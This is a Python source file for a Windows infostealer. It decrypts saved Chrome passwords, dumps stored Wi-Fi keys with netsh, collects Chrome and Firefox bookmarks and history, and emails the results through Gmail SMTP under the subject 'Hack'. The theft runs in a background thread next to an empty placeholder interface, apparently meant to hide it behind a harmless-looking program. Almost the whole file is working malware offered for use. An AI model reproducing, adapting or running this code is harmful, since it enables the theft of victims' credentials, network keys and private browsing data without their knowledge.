from browser_history.browsers import Chrome, Firefox
from Crypto.Cipher import AES
from datetime import timedelta
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from threading import Thread
import base64
import json
import os
import psutil
import pythoncom
import shutil
import smtplib
import sqlite3
import win32crypt
import wmi


def sent_email(text, subject):
    message = MIMEMultipart()
    message["from"] = os.getlogin()
    message["to"] = "username"
    message["subject"] = subject
    message.attach(MIMEText(text))

    with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
        smtp.ehlo()
        smtp.starttls()
        smtp.login("username", "password")
        smtp.send_message(message)


def laptop_brand():
    try:
        pythoncom.CoInitialize()
        my_system = wmi.WMI().Win32_ComputerSystem()[0]
        return f"{my_system.Manufacturer} {my_system.SystemFamily}"
    except:
        return "UNKNOWN"


def battery_charge_percentage():
    try:
        battery = psutil.sensors_battery()
        text = f"Battery percentage: {battery.percent}%\n"
        text += f"Power plugged in: {battery.power_plugged}\n"
        text += f"Battery left: {str(timedelta(seconds=battery.secsleft))}"
        return text
    except:
        return "NO BATTERY"


def wifi():
    try:
        stream = os.popen("netsh wlan show profile")
        output = stream.readlines()[9:-1]
        wifiNames = [output[i][27:-1] for i in range(len(output))]
        result = {}

        for name in wifiNames:
            stream = os.popen(
                f'netsh wlan show profile "{name}" key=clear').readlines()[32]

            if "Key Content" in stream:
                result[name] = stream[stream.find(": ") + 2:-1]
            else:
                result[name] = ""

        return result
    except:
        return {}


def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""


def sites_auth():
    try:
        result = []
        local_state_path = f"{os.environ['USERPROFILE']}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
        with open(local_state_path, "r") as file:
            local_state = file.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

        db_path = f"{os.environ['USERPROFILE']}\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data"
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        for row in cursor.fetchall():
            url = row[0]
            username = row[2]
            password = decrypt_password(row[3], key)
            if username and password:
                result.append((url, username, password))

        cursor.close()
        db.close()
        os.remove(filename)

    except:
        pass

    return result


def bookmarks():
    try:
        urls = set({})
        chrome_outputs = Chrome().fetch_bookmarks().bookmarks
        firefox_outputs = Firefox().fetch_bookmarks().bookmarks

        for item in chrome_outputs:
            urls.add(item[1][8 if item[1].startswith("https://") else 7:])

        for item in firefox_outputs:
            urls.add(item[1][8 if item[1].startswith("https://") else 7:])
    except:
        pass

    return urls


def histories():
    try:
        urls = set({})
        chrome_outputs = Chrome().fetch_history().histories
        firefox_outputs = Firefox().fetch_history().histories

        for item in chrome_outputs:
            urls.add(item[1][8 if item[1].startswith(
                "https://") else 7:item[1].find('/', 8)])

        for item in firefox_outputs:
            urls.add(item[1][8 if item[1].startswith(
                "https://") else 7:item[1].find('/', 8)])

    except:
        pass

    return urls


def back_end():
    brand = laptop_brand()
    battery_status = battery_charge_percentage()
    wifi_info = wifi()
    sites_password = sites_auth()
    browsers_bookmarks = bookmarks()
    browsers_histories = histories()

    result = f"{brand}\n\n{battery_status}\n\n#WIFI HISTORY#\n"

    for username, password in wifi_info.items():
        result += f"{username}: {password}\n"

    result += "\n\n#SITES PASSWORD#\n"
    for url, username, password in sites_password:
        result += f"{url}\n"
        result += f'"{username}"  ::  "{password}"\n\n'

    result += "\n#BOOKMARKS#\n"
    for item in browsers_bookmarks:
        result += f"{item}\n"

    result += "\n\n#HISTORIES#\n"
    for item in browsers_histories:
        result += f"{item}\n"

    sent_email(result, "Hack")


def ui():
    # Write your code here #
    pass


x = Thread(target=back_end)
x.start()

y = Thread(target=ui)
y.start()
